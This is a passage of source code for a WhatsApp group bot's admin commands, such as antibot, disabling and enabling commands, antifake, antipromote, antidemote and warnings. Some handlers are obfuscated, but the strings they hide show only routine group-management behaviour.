Void[_0x2c4fcf(0x8f)](Void[_0x2c4fcf(0xa5)]['id']),isAdmins=citel[_0x2c4fcf(0xa6)]?groupAdmins['includes'](citel[_0x2c4fcf(0xad)]):![],isBotAdmins=citel[_0x2c4fcf(0xa6)]?groupAdmins[_0x2c4fcf(0x9a)](botNumber):![];if(!isAdmins&&!isCreator)return citel[_0x2c4fcf(0xac)](tlang()[_0x2c4fcf(0x92)]);let checkinfo=await sck[_0x2c4fcf(0xa2)]({'id':citel[_0x2c4fcf(0x9b)]})||await new sck({'id':citel[_0x2c4fcf(0x9b)]})[_0x2c4fcf(0xb1)](),textt=text?text['toLowerCase']()[_0x2c4fcf(0x88)]():![],action=textt?textt[_0x2c4fcf(0xa7)]('\x20')[0x0]:![];function _0x376b(){const _0x26ca64=['act','updateOne','deact','reply','sender','\x20in\x20this\x20Group!_*\x0a\x20*Toggle:\x20_','31743uMncUs','disable','save','trim','*_Antibot\x20Succesfully\x20Disable\x20in\x20group!_*','*_UHH\x20Please,\x20Provide\x20Admin\x20Role\x20First_*','false','Enabled','group','*_Antibot\x20Succesfully\x20set\x20to\x20kick\x20Bot\x20Users!_*','decodeJid','send','*_Antibot\x20Already\x20Enabled\x20in\x20Current\x20Chat_*','admin','*_Antibot\x20Already\x20Disabled\x20in\x20Current\x20Chat_*','startsWith','267310Oakvjx','610857GRgPyR','649932PmmMyY','Disabled','off','includes','chat','5877639YkNrHt','1231230pAMugo','4OsaJqn','antibot','1143136tzUKkL','*_Antibot\x20Currently\x20','findOne','enable','12iaZUIV','user','isGroup','split','\x20on/off_*'];_0x376b=function(){return _0x26ca64;};return _0x376b();}if(!action)return await citel['send'](_0x2c4fcf(0xa1)+(checkinfo[_0x2c4fcf(0x9f)]===_0x2c4fcf(0x8b)?_0x2c4fcf(0x98):_0x2c4fcf(0x8c))+_0x2c4fcf(0xae)+(prefix+cmdName)+_0x2c4fcf(0xa8));else{if(action[_0x2c4fcf(0x94)](_0x2c4fcf(0x99))||action[_0x2c4fcf(0x94)](_0x2c4fcf(0xab))||action[_0x2c4fcf(0x94)](_0x2c4fcf(0xb0))){if(checkinfo['antibot']===_0x2c4fcf(0x8b))return await citel[_0x2c4fcf(0xac)](_0x2c4fcf(0x93));return await sck[_0x2c4fcf(0xaa)]({'id':citel[_0x2c4fcf(0x9b)]},{'antibot':_0x2c4fcf(0x8b)}),await citel[_0x2c4fcf(0x90)](_0x2c4fcf(0x89));}else{if(action[_0x2c4fcf(0x94)]('on')||action[_0x2c4fcf(0x94)](_0x2c4fcf(0xa9))||action[_0x2c4fcf(0x94)](_0x2c4fcf(0xa3))){if(checkinfo[_0x2c4fcf(0x9f)]==='true')return await citel[_0x2c4fcf(0xac)](_0x2c4fcf(0x91));if(isBotAdmins)return await sck['updateOne']({'id':citel['chat']},{'antibot':'true'}),await citel[_0x2c4fcf(0x90)](_0x2c4fcf(0x8e));else return await citel[_0x2c4fcf(0xac)](_0x2c4fcf(0x8a));}else return await citel[_0x2c4fcf(0xac)]('*_Uhh\x20Dear,\x20Please\x20Provide\x20Valid\x20Instruction_*\x0a*Eg:\x20_'+(prefix+cmdName)+_0x2c4fcf(0xa8));}}
})
//---------------------------------------------------------------------------
//---------------------------------------------------------------------------
cmd({
    pattern: "disable",
    desc: "disable cmds in Group.!",
    category: "group",
    filename: __filename
},
async(Void, citel, text , {isCreator}) => {
  const _0x1d9361=_0x127b;(function(_0x123c59,_0x38488e){const _0x4f5927=_0x127b,_0x2dc94b=_0x123c59();while(!![]){try{const _0x1b484b=-parseInt(_0x4f5927(0x1db))/0x1*(-parseInt(_0x4f5927(0x1c0))/0x2)+-parseInt(_0x4f5927(0x1c3))/0x3+parseInt(_0x4f5927(0x1bc))/0x4*(parseInt(_0x4f5927(0x1c5))/0x5)+parseInt(_0x4f5927(0x1ca))/0x6+parseInt(_0x4f5927(0x1e1))/0x7+-parseInt(_0x4f5927(0x1d6))/0x8*(parseInt(_0x4f5927(0x1d4))/0x9)+-parseInt(_0x4f5927(0x1e7))/0xa*(parseInt(_0x4f5927(0x1e0))/0xb);if(_0x1b484b===_0x38488e)break;else _0x2dc94b['push'](_0x2dc94b['shift']());}catch(_0x255304){_0x2dc94b['push'](_0x2dc94b['shift']());}}}(_0xc473,0x3308a));if(!citel[_0x1d9361(0x1bb)])return citel[_0x1d9361(0x1ce)](tlang()[_0x1d9361(0x1d5)]);const groupAdmins=await getAdmin(Void,citel),botNumber=await Void[_0x1d9361(0x1dd)](Void[_0x1d9361(0x1cb)]['id']),isAdmins=citel[_0x1d9361(0x1bb)]?groupAdmins['includes'](citel['sender']):![],isBotAdmins=citel[_0x1d9361(0x1bb)]?groupAdmins[_0x1d9361(0x1cf)](botNumber):![];function _0xc473(){const _0x5035f2=['cmds','2484216cqyAHk','user','\x27\x20is\x20not\x20a\x20bot\x20cmd,\x20Provide\x20valid\x20cmd_*','*_Uhh\x20Dear,\x20I\x20can\x27t\x20disable\x20that\x20cmd_*','send','includes','split','*_Uhh\x20Dear,\x20Theres\x20no\x20cmd\x20disabled\x20in\x20current\x20group_*','disablecmds','test','9jTOFxv','group','1000024agaHtD','find','pattern','false,','\x0a*_Disable\x20cmds\x20:_*\x20```','1IvBDbJ','enable','decodeJid','false','toLowerCase','11418UpETmg','1264900QSGmLC','commands','updateOne','list','```','findOne','6860EBnErX','*_Disable\x20cmds\x20:_*\x20```','alias','*Provide\x20cmd\x20name\x20to\x20disable\x20in\x20group*\x0a*Ex\x20','replace','isGroup','92rfIqmr','chat','*Uhh\x20Dear,\x20Provided\x20cmd\x20already\x20in\x20disable\x20cmds*','info','227118msrhpy','startsWith','trim','77598ksrfVq','\x22\x20Succesfully\x20added\x20in\x20disable\x20cmds_*','79060BsAVtu','reply','disable','admin'];_0xc473=function(){return _0x5035f2;};return _0xc473();}if(!isAdmins&&!isCreator)return citel[_0x1d9361(0x1c6)](tlang()[_0x1d9361(0x1c8)]);function _0x127b(_0x124a51,_0x480f65){const _0xc47391=_0xc473();return _0x127b=function(_0x127b61,_0x4f91c7){_0x127b61=_0x127b61-0x1b8;let _0x3e747f=_0xc47391[_0x127b61];return _0x3e747f;},_0x127b(_0x124a51,_0x480f65);}let checkinfo=await sck[_0x1d9361(0x1e6)]({'id':citel[_0x1d9361(0x1bd)]})||await new sck({'id':citel[_0x1d9361(0x1bd)]})['save'](),textt=text?text[_0x1d9361(0x1df)]()[_0x1d9361(0x1c2)]():![],cmdName=textt?textt[_0x1d9361(0x1d0)]('\x20')[0x0]:'';if(!cmdName)return await citel[_0x1d9361(0x1ce)](_0x1d9361(0x1b9)+prefix+'disable\x20tag(to\x20disabled\x20\x27tag\x27\x20cmd)/info*');else{if(cmdName[_0x1d9361(0x1c1)](_0x1d9361(0x1bf))||cmdName['startsWith'](_0x1d9361(0x1e4))||cmdName[_0x1d9361(0x1c1)](_0x1d9361(0x1c9)))return await citel['send'](checkinfo[_0x1d9361(0x1d2)]===_0x1d9361(0x1de)?_0x1d9361(0x1d1):_0x1d9361(0x1e8)+checkinfo[_0x1d9361(0x1d2)][_0x1d9361(0x1ba)]('false,','')+'```');else{if(cmdName[_0x1d9361(0x1c1)](_0x1d9361(0x1dc))||cmdName[_0x1d9361(0x1c1)](_0x1d9361(0x1c7)))return await citel[_0x1d9361(0x1c6)](_0x1d9361(0x1cd));else{if(cmdName){const cmds=sᴜʜᴀɪʟ_ᴍᴅ['commands'][_0x1d9361(0x1d7)](_0x3d1011=>_0x3d1011[_0x1d9361(0x1d8)]===cmdName)||sᴜʜᴀɪʟ_ᴍᴅ[_0x1d9361(0x1e2)][_0x1d9361(0x1d7)](_0x2cf945=>_0x2cf945[_0x1d9361(0x1b8)]&&_0x2cf945['alias'][_0x1d9361(0x1cf)](cmdName));if(cmds){let newCmd=cmds[_0x1d9361(0x1d8)][_0x1d9361(0x1ba)](/[.*+?^${}()|[\]\\]/g,'\x5c$&'),regex=new RegExp('\x5cb'+newCmd+'\x5cb');if(regex[_0x1d9361(0x1d3)](checkinfo[_0x1d9361(0x1d2)]))return await citel[_0x1d9361(0x1ce)](_0x1d9361(0x1be));var newDisable_Cmd=checkinfo[_0x1d9361(0x1d2)]+','+cmds[_0x1d9361(0x1d8)];await sck[_0x1d9361(0x1e3)]({'id':citel[_0x1d9361(0x1bd)]},{'disablecmds':newDisable_Cmd});let lists=newDisable_Cmd['replace'](_0x1d9361(0x1d9),'');return await citel[_0x1d9361(0x1ce)]('*_\x22'+cmdName+_0x1d9361(0x1c4)+(lists===''?'':_0x1d9361(0x1da)+lists+_0x1d9361(0x1e5)));}else return await citel['reply']('*_\x27'+cmdName+_0x1d9361(0x1cc));}}}}

})
//---------------------------------------------------------------------------
cmd({
    pattern: "enable",
    desc: "enable a cmd in Group.!",
    category: "group",
    filename: __filename
},
async(Void, citel, text , {isCreator}) => {
  
  const _0x19acb0=_0x2b87;(function(_0x1e83d3,_0x35eaa4){const _0x18315e=_0x2b87,_0x2f59dd=_0x1e83d3();while(!![]){try{const _0x16b8b5=-parseInt(_0x18315e(0xfc))/0x1+parseInt(_0x18315e(0x101))/0x2*(parseInt(_0x18315e(0x103))/0x3)+-parseInt(_0x18315e(0x105))/0x4*(-parseInt(_0x18315e(0x102))/0x5)+parseInt(_0x18315e(0xf8))/0x6+-parseInt(_0x18315e(0x108))/0x7*(parseInt(_0x18315e(0x10a))/0x8)+parseInt(_0x18315e(0x100))/0x9*(-parseInt(_0x18315e(0x115))/0xa)+parseInt(_0x18315e(0x10d))/0xb;if(_0x16b8b5===_0x35eaa4)break;else _0x2f59dd['push'](_0x2f59dd['shift']());}catch(_0x2a57d0){_0x2f59dd['push'](_0x2f59dd['shift']());}}}(_0x59df,0xc228d));if(!citel['isGroup'])return citel[_0x19acb0(0x104)](tlang()[_0x19acb0(0xff)]);const groupAdmins=await getAdmin(Void,citel),botNumber=await Void[_0x19acb0(0xf6)](Void[_0x19acb0(0x10e)]['id']),isAdmins=citel[_0x19acb0(0xfe)]?groupAdmins['includes'](citel[_0x19acb0(0x110)]):![],isBotAdmins=citel[_0x19acb0(0xfe)]?groupAdmins[_0x19acb0(0xf5)](botNumber):![];function _0x59df(){const _0x2fc64a=['165YTTviz','1506531DdbIjN','send','137844wiflDz','startsWith','test','14TQRbZa','updateOne','5147512SXhXBs','false',',all','19530247uQLOXJ','user','admin','sender','save','replace','chat','_There\x27s\x20no\x20cmd\x20disabled\x20with\x20*','710Zslghn','toLowerCase','includes','decodeJid','trim','7264044TkjRho','reply','findOne','*_All\x20disable\x20cmds\x20succesfully\x20enabled_*','1360455GGWakc','\x22\x20Succesfully\x20removed\x20from\x20disable\x20cmds_*','isGroup','group','149949qpNFMz','2emBDDA'];_0x59df=function(){return _0x2fc64a;};return _0x59df();}if(!isAdmins&&!isCreator)return citel[_0x19acb0(0xf9)](tlang()[_0x19acb0(0x10f)]);function _0x2b87(_0x559939,_0x1e01c1){const _0x59dff7=_0x59df();return _0x2b87=function(_0x2b8751,_0x158178){_0x2b8751=_0x2b8751-0xf5;let _0x8a8f58=_0x59dff7[_0x2b8751];return _0x8a8f58;},_0x2b87(_0x559939,_0x1e01c1);}let checkinfo=await sck[_0x19acb0(0xfa)]({'id':citel[_0x19acb0(0x113)]})||await new sck({'id':citel['chat']})[_0x19acb0(0x111)](),textt=text?text[_0x19acb0(0x116)]()[_0x19acb0(0xf7)]():![],cmdName=textt?','+textt['split']('\x20')[0x0]:'',ReplaceCmd=cmdName['replace'](/[.*+?^${}()|[\]\\]/g,'\x5c$&'),regex=new RegExp('\x5cb'+ReplaceCmd+'\x5cb');if(!cmdName||cmdName==='')return await citel[_0x19acb0(0x104)]('*Please\x20provide\x20disabled\x20cmd\x20name\x20to\x20enable\x20it*\x0a*Ex\x20'+prefix+'enable\x20tag(if\x20\x27tag\x27\x20cmd\x20disabled)/all(reset\x20disables)*');else{if(cmdName[_0x19acb0(0x106)](_0x19acb0(0x10c)))return await sck[_0x19acb0(0x109)]({'id':citel['chat']},{'disablecmds':_0x19acb0(0x10b)}),await citel[_0x19acb0(0x104)](_0x19acb0(0xfb));else{if(regex[_0x19acb0(0x107)](checkinfo['disablecmds'])&&checkinfo['disablecmds'][_0x19acb0(0xf5)](cmdName)){let newCmds=checkinfo['disablecmds'][_0x19acb0(0x112)](regex,'');return await sck[_0x19acb0(0x109)]({'id':citel[_0x19acb0(0x113)]},{'disablecmds':newCmds}),await citel[_0x19acb0(0x104)]('*_\x22'+cmdName[_0x19acb0(0x112)](',','')+_0x19acb0(0xfd));}else return await citel[_0x19acb0(0x104)](_0x19acb0(0x114)+cmdName[_0x19acb0(0x112)](',','')+'*\x20name_');}}

})
//---------------------------------------------------------------------------
//---------------------------------------------------------------------------
cmd({
            pattern: "join",
            desc: "joins group by link",
            category: "owner",
	 filename: __filename,
            use: '<group link.>',
        },
        async(Void, citel, text,{ isCreator }) => {
            if (!isCreator) return citel.reply(tlang().owner);
            if (!text) return citel.reply(`Please give me Query ${tlang().greet}`);
            if (!text.split(" ")[0] && !text.split(" ")[0].includes("whatsapp.com")) return await citel.reply("Link Invalid, Please Send a valid whatsapp Group Link!");
            let result = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
            await Void.groupAcceptInvite(result)
                .then((res) => citel.reply("🟩Joined Group"))
                .catch((err) => citel.reply("Error in Joining Group"));

        }
    )
    //---------------------------------------------------------------------------
/*

cmd({
        pattern: "support",
        desc: "Sends official support group link.",
        category: "group",
        filename: __filename,
    },
    async(Void, citel, text) => {
        citel.reply(`*Check your Pm ${tlang().greet}*`);
        await Void.sendMessage(`${citel.sender}`, {
            image: log0,
            caption: `*Group Name: Secktor-Support*\n*Group Link:* https://chat.whatsapp.com/Bl2F9UTVU4CBfZU6eVnrbC`,
        });

    }
)
*/
//===========================================================================
cmd({
    pattern: "gdesc",
    alias : ['setgdesc','gdesc'],
    desc: "Set Description of Group",
    category: "group",
    filename: __filename,
    use: '<enter Description Text>',
},
async(Void, citel, text,{ isCreator }) => {
    if (!citel.isGroup) return citel.reply(tlang().group);
    if(!text) return await citel.reply("*Provide Description text, You wants to Set*")
    const groupAdmins = await getAdmin(Void, citel)
    const botNumber = await Void.decodeJid(Void.user.id)
    const isBotAdmins = citel.isGroup ? groupAdmins.includes(botNumber) : false;
    const isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) : false;
    if (!isBotAdmins) return await citel.reply(`*_I'm Not Admin In This Group, Idiot_*`); 
    if (!isAdmins) return citel.reply(tlang().admin);
    
    try {
        await Void.groupUpdateDescription(citel.chat, text);
        citel.reply('*_✅Group description Updated Successfuly.!_*') 
        return await Void.sendMessage(citel.chat, { react: { text: '✨', key: citel.key }});
    } catch(e) { return await Void.sendMessage(users , {text :"Error While Updating Group Description\nReason : " + e, } ,{quoted : citel})   }
}
)
//---------------------------------------------------------------------------
cmd({
    pattern: "gname",
    alias : ['setgname','gname'],
    desc: "Set Description of Group",
    category: "group",
    filename: __filename,
    use: '<enter Description Text>',
},
async(Void, citel, text,{ isCreator }) => {
    if (!citel.isGroup) return citel.reply(tlang().group);
    if(!text) return await citel.reply("*Uhh Dear, Give text to Update This Group Name*")
    const groupAdmins = await getAdmin(Void, citel)
    const botNumber = await Void.decodeJid(Void.user.id)
    const isBotAdmins = citel.isGroup ? groupAdmins.includes(botNumber) : false;
    const isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) : false;
    if (!isBotAdmins) return await citel.reply(`*_I'm Not Admin In This Group, Idiot_*`); 
    if (!isAdmins) return citel.reply(tlang().admin);
    
    try {
        await Void.groupUpdateSubject(citel.chat, text)
        citel.reply('*_✅Group Name Updated Successfuly.!_*') 
        return await Void.sendMessage(citel.chat, { react: { text: '✨', key: citel.key }});
    } catch(e) { return await Void.sendMessage(users , {text :"_Error While Updating Group Name_\nReason : " + e, } ,{quoted : citel})   }
}
)
    //---------------------------------------------------------------------------
cmd({
        pattern: "antifake",
        desc: "Allow to Join Group For Specific Country Code",
        category: "group",
        filename: __filename,
    },
    async(Void, citel, text,{ isCreator }) => {
        const _0x3d53e3=_0x4d30;(function(_0x3289e8,_0x35a484){const _0x3f55e9=_0x4d30,_0x4c3533=_0x3289e8();while(!![]){try{const _0x57c2cd=-parseInt(_0x3f55e9(0x15f))/0x1+-parseInt(_0x3f55e9(0x154))/0x2*(-parseInt(_0x3f55e9(0x15a))/0x3)+-parseInt(_0x3f55e9(0x163))/0x4*(parseInt(_0x3f55e9(0x145))/0x5)+-parseInt(_0x3f55e9(0x143))/0x6*(-parseInt(_0x3f55e9(0x14c))/0x7)+-parseInt(_0x3f55e9(0x149))/0x8+-parseInt(_0x3f55e9(0x142))/0x9+parseInt(_0x3f55e9(0x14f))/0xa;if(_0x57c2cd===_0x35a484)break;else _0x4c3533['push'](_0x4c3533['shift']());}catch(_0x3b6134){_0x4c3533['push'](_0x4c3533['shift']());}}}(_0x4e47,0x29ecc));if(!citel[_0x3d53e3(0x14a)])return citel[_0x3d53e3(0x146)](tlang()['group']);const groupMetadata=citel[_0x3d53e3(0x14a)]?await Void[_0x3d53e3(0x151)](citel['chat'])[_0x3d53e3(0x13f)](_0x315e70=>{}):'',participants=citel[_0x3d53e3(0x14a)]?await groupMetadata[_0x3d53e3(0x140)]:'',groupAdmins=await getAdmin(Void,citel),isAdmins=citel[_0x3d53e3(0x14a)]?groupAdmins[_0x3d53e3(0x148)](citel[_0x3d53e3(0x159)]):![];if(!isAdmins&&!isCreator)return citel[_0x3d53e3(0x146)](tlang()['admin']);function _0x4d30(_0x518d0a,_0x4df86b){const _0x4e47ac=_0x4e47();return _0x4d30=function(_0x4d308,_0x5dbaea){_0x4d308=_0x4d308-0x13e;let _0x3f5c8a=_0x4e47ac[_0x4d308];return _0x3f5c8a;},_0x4d30(_0x518d0a,_0x4df86b);}let checkinfo=await sck[_0x3d53e3(0x141)]({'id':citel[_0x3d53e3(0x162)]})||await new sck({'id':citel[_0x3d53e3(0x162)]})[_0x3d53e3(0x14b)]();if(text[_0x3d53e3(0x15b)]()[_0x3d53e3(0x161)](_0x3d53e3(0x152))||text[_0x3d53e3(0x15b)]()[_0x3d53e3(0x161)](_0x3d53e3(0x158))||text[_0x3d53e3(0x15b)]()[_0x3d53e3(0x161)](_0x3d53e3(0x144))){if(checkinfo[_0x3d53e3(0x15d)]==_0x3d53e3(0x155))return await citel[_0x3d53e3(0x15e)](_0x3d53e3(0x147));return await sck[_0x3d53e3(0x14e)]({'id':citel[_0x3d53e3(0x162)]},{'antifake':'false'}),await citel[_0x3d53e3(0x15e)]('*Anti_Fake\x20Disable\x20Succesfully!*');}else{if(!text)return await citel[_0x3d53e3(0x15e)]('*_Antifake\x20'+(checkinfo[_0x3d53e3(0x15d)]===_0x3d53e3(0x155)?_0x3d53e3(0x156):_0x3d53e3(0x150)+checkinfo['antifake']+'\x22')+_0x3d53e3(0x160));}function _0x4e47(){const _0x1417c1=['sender','1119OfZcoi','toLowerCase','antifake\x2092_*','antifake','send','95149nQhOqw','\x20Country\x20Code!_*\x0a\x20*Provide\x20Country\x20code\x20to\x20Update\x20Antifake\x20Status*\x0a*Eg:\x20_.antifake\x2092_*','startsWith','chat','4OBMwaq','*Anti_Fake\x20Succesfully\x20set\x20to\x20\x22','catch','participants','findOne','803394fyIvKZ','1356612CgXDOm','disable','319485kWURrN','reply','*Anti_Fake\x20Already\x20Disabled\x20In\x20Current\x20Chat!*','includes','2030144kUUVSD','isGroup','save','7OpPQtf','*_Please\x20provide\x20a\x20country\x20code\x20First_*\x0a\x20*_Only\x20numbers\x20to\x20join\x20this\x20group._*\x0a*_eg:\x20','updateOne','4462100VzFSpa','set\x20to\x20\x22','groupMetadata','off','split','8ZBiSLh','false','Not\x20set\x20to\x20any','\x22!*\x0a*_Now\x20People\x20Joined\x20Group\x20Who\x27s\x20Number\x20Start\x20With\x20','deact'];_0x4e47=function(){return _0x1417c1;};return _0x4e47();}let country_code=text?parseInt(text[_0x3d53e3(0x153)]('\x20')[0x0]):![];if(!text||!country_code||isNaN(country_code)||country_code===0x0)return await citel[_0x3d53e3(0x15e)](_0x3d53e3(0x14d)+prefix+_0x3d53e3(0x15c));else{if(country_code)return await sck[_0x3d53e3(0x14e)]({'id':citel['chat']},{'antifake':''+country_code}),await citel['send'](_0x3d53e3(0x13e)+country_code+_0x3d53e3(0x157)+country_code+'_*');else return await citel['send']('*_Please\x20provide\x20a\x20Valid\x20country\x20code\x20First_*\x0a\x20*_Only\x20numbers\x20to\x20join\x20this\x20group._*\x0a*_eg:\x20'+prefix+_0x3d53e3(0x15c));}
});

//---------------------------------------------------------------------------
    cmd({
        pattern: "antidemote",
        desc: "Detects Promote and Automaticaly demote promoted person.", 
        category: "group",
        filename: __filename,
    },
    async(Void, citel, text,{ isCreator }) => {
        if (!citel.isGroup) return citel.reply(tlang().group);
        const groupMetadata = citel.isGroup ? await Void.groupMetadata(citel.chat).catch((e) => {}) : "";
        const participants = citel.isGroup ? await groupMetadata.participants : "";
        const groupAdmins = await getAdmin(Void, citel)
        const isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) : false;
        if (!isAdmins && !isCreator) return citel.reply(tlang().admin);
            
      let checkinfo = await sck.findOne({ id : citel.chat })  || await new sck({ id: citel.chat}).save();
      if (text.toLowerCase().startsWith("on") || text.toLowerCase().startsWith("act") || text.toLowerCase().startsWith("enable") ) {
        if (checkinfo.antidemote == 'true') return await citel.send("*Anti_Demote Already Enabled In Current Chat!*")
        await sck.updateOne({ id: citel.chat }, { antidemote : 'true' });
        return await citel.send("*Anti_Demote Enable Succesfully! _No One Demote Here Now_.*")
      }else if (text.toLowerCase().startsWith("off") || text.toLowerCase().startsWith("deact") || text.toLowerCase().startsWith("disable") ) {
        if (checkinfo.antidemote == 'false') return await citel.send("*Anti_Demote Already Disabled In Current Chat!*")
        await sck.updateOne({ id: citel.chat }, { antidemote : 'false' });
        return await citel.send("*Anti_Demote Disable Succesfully!*")
      }
      else return await citel.reply(`*Uhh Dear, Please Toggle between "On" And "Off".* \n*_To Enable & Disable Stop Demoting Peoples!_*`)
});
    //---------------------------------------------------------------------------
cmd({
        pattern: "antipromote",
        desc: "Detects Promote and Automaticaly demote promoted person.", 
        category: "group",
        filename: __filename,
    },
    async(Void, citel, text,{ isCreator }) => {
        if (!citel.isGroup) return citel.reply(tlang().group);
        const groupMetadata = citel.isGroup ? await Void.groupMetadata(citel.chat).catch((e) => {}) : "";
        const participants = citel.isGroup ? await groupMetadata.participants : "";
        const groupAdmins = await getAdmin(Void, citel)
        const isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) : false;
        if (!isAdmins && !isCreator) return citel.reply(tlang().admin);
            
      let checkinfo = await sck.findOne({ id : citel.chat })  || await new sck({ id: citel.chat}).save();
      if (text.toLowerCase().startsWith("on") || text.toLowerCase().startsWith("act") || text.toLowerCase().startsWith("enable") ) {
        if (checkinfo.antipromote == 'true') return await citel.send("*Anti_Promote Already Enabled In Current Chat!*")
        await sck.updateOne({ id: citel.chat }, { antipromote : 'true' });
        return await citel.send("*Anti_Promote Enable Succesfully! _No One Promote Here Now_.*")
      }else if (text.toLowerCase().startsWith("off") || text.toLowerCase().startsWith("deact") || text.toLowerCase().startsWith("disable") ) {
        if (checkinfo.antipromote == 'false') return await citel.send("*Anti_Promote Already Disabled In Current Chat!*")
        await sck.updateOne({ id: citel.chat }, { antipromote : 'false' });
        return await citel.send("*Anti_Promote Disable Succesfully!*")
      }
      else return await citel.reply(`*Uhh Dear, Please Toggle between "On" And "Off".* \n*_To Stop Promoting Peoples in Chat_*`)
});
    //---------------------------------------------------------------------------
cmd({
        pattern: "pdm",
        desc: "Detect Promote/Demote Users And Send Alerts in Chat ",
        category: "group",
        filename: __filename,
    },
    async(Void, citel, text,{ isCreator }) => {
        if (!citel.isGroup) return citel.reply(tlang().group);
        const groupMetadata = citel.isGroup ? await Void.groupMetadata(citel.chat).catch((e) => {}) : "";
        const participants = citel.isGroup ? await groupMetadata.participants : "";
        const groupAdmins = await getAdmin(Void, citel)
        const isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) : false;
        if (!isAdmins && !isCreator) return citel.reply(tlang().admin);
            
      let checkinfo = await sck.findOne({ id : citel.chat })  || await new sck({ id: citel.chat}).save();
      if (text.toLowerCase().startsWith("on") || text.toLowerCase().startsWith("act") || text.toLowerCase().startsWith("enable") ) {
        if (checkinfo.pdm == 'true') return await citel.send("*Promote/Demote Alerts Already Enabled In Current Chat!*")
        await sck.updateOne({ id: citel.chat }, { pdm : 'true' });
        return await citel.send("*Promote/Demote Alerts Enable Succesfully!*")
      }else if (text.toLowerCase().startsWith("off") || text.toLowerCase().startsWith("deact") || text.toLowerCase().startsWith("disable") ) {
        if (checkinfo.pdm == 'false') return await citel.send("*Promote/Demote Alerts Already Disabled In Current Chat!*")
        await sck.updateOne({ id: citel.chat }, { pdm : 'false' });
        return await citel.send("*Promote/Demote Alerts Disable Succesfully!*")
      }
      else return await citel.reply(`*Uhh Dear, Please Toggle between "On" And "Off".* \n*_To get And Stop Promote/Demote Alerts_*`)
});
    //---------------------------------------------------------------------------
cmd({
            pattern: "warn",
            desc: "Warns user in Group.",
            category: "group",
            filename: __filename,
            use: '<quote|reply|number>',
        },
        async(Void, citel, text,{ isCreator }) => {
            if (!citel.isGroup) return citel.reply(`This Command is only for group.`)
            const groupAdmins = await getAdmin(Void, citel)
            const isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) : false;
            if (!isAdmins) return citel.reply('This command is only for Admin.')
            const S=m;function Z(){const F=['126402oKAcRa','date','Removing\x20User\x20because\x20Warn\x20limit\x20exceeded\x0a\x0a*All\x20Warnings.*\x0a','chat','8qachoN','580yXDZAo','groupParticipantsUpdate','114528WgITIL','reply','groupMetadata','│\x20*🔰Time:-*\x20','find','locale','log','196311jXGmuc','quoted','save','*\x0a╭─────────────◆\x0a│\x20*🍁In\x20Group:-*\x20','759700KYdstU','warnedby','pushName','reason','8dUtMfa','2BlOCqD','550MdvhLT','*----Warn----*\x0aUser:\x20@','54828ViphBF','subject','1100323uEahgH','30204512uUuJcj','*There\x20are\x20total\x20','split','│\x20*⚠️Warned\x20by:-*\x20','length','sender','setDefault','group','Asia/KOLKATA','../config','215XZLRSE','HH:mm:ss','warn','remove'];Z=function(){return F;};return Z();}(function(U,w){const c=m,s=U();while(!![]){try{const q=parseInt(c(0x1eb))/0x1*(parseInt(c(0x1f0))/0x2)+parseInt(c(0x1e7))/0x3*(parseInt(c(0x1ef))/0x4)+-parseInt(c(0x200))/0x5*(-parseInt(c(0x204))/0x6)+-parseInt(c(0x1f5))/0x7*(-parseInt(c(0x1dd))/0x8)+-parseInt(c(0x1f3))/0x9*(-parseInt(c(0x1de))/0xa)+parseInt(c(0x1f1))/0xb*(parseInt(c(0x1e0))/0xc)+-parseInt(c(0x1f6))/0xd;if(q===w)break;else s['push'](s['shift']());}catch(B){s['push'](s['shift']());}}}(Z,0x707d4));function m(Y,U){const w=Z();return m=function(s,q){s=s-0x1dd;let B=w[s];return B;},m(Y,U);}if(!citel['quoted'])return citel[S(0x1e1)]('Please\x20quote\x20a\x20user\x20master.');const timesam=moment(moment())['format'](S(0x201));moment['tz'][S(0x1fc)](S(0x1fe))[S(0x1e5)]('id');try{let metadata=await Void[S(0x1e2)](citel[S(0x207)]);await new warndb({'id':citel['quoted'][S(0x1fb)][S(0x1f8)]('@')[0x0]+S(0x202),'reason':text,'group':metadata[S(0x1f4)],'warnedby':citel[S(0x1ed)],'date':timesam})[S(0x1e9)]();let ment=citel[S(0x1e8)][S(0x1fb)];Void['sendMessage'](citel['chat'],{'text':S(0x1f2)+citel[S(0x1e8)][S(0x1fb)][S(0x1f8)]('@')[0x0]+'\x0aWith\x20Reason:\x20'+text+'\x0aWarned\x20by:\x20'+citel[S(0x1ed)],'mentions':[citel[S(0x1e8)][S(0x1fb)]]},{'quoted':citel});let h=await warndb[S(0x1e4)]({'id':citel['quoted'][S(0x1fb)][S(0x1f8)]('@')[0x0]+S(0x202)});const Config=require(S(0x1ff));if(h[S(0x1fa)]>Config['warncount']){teskd=S(0x206);let h=await warndb[S(0x1e4)]({'id':citel[S(0x1e8)][S(0x1fb)][S(0x1f8)]('@')[0x0]+S(0x202)});teskd+=S(0x1f7)+h[S(0x1fa)]+'\x20\x20warnings.*\x0a';for(let i=0x0;i<h[S(0x1fa)];i++){teskd+='*'+(i+0x1)+S(0x1ea)+h[i][S(0x1fd)]+'\x0a',teskd+=S(0x1e3)+h[i][S(0x205)]+'\x0a',teskd+=S(0x1f9)+h[i][S(0x1ec)]+'\x0a',teskd+='│\x20_📍Reason:\x20'+h[i][S(0x1ee)]+'_\x0a╰─────────────◆\x0a\x0a';}citel[S(0x1e1)](teskd),await Void[S(0x1df)](citel['chat'],[citel['quoted'][S(0x1fb)]],S(0x203));}}catch(Y){console[S(0x1e6)](Y);}
            
        }
    )
    
//---------------------------------------------------------------------------
cmd({
    pattern: "common",
    desc: "Get common participants in two groups, and kick using .common kick, jid",
    category: "owner",
    filename: __filename,

},
async(Void, citel, text,{ isCreator }) => {         
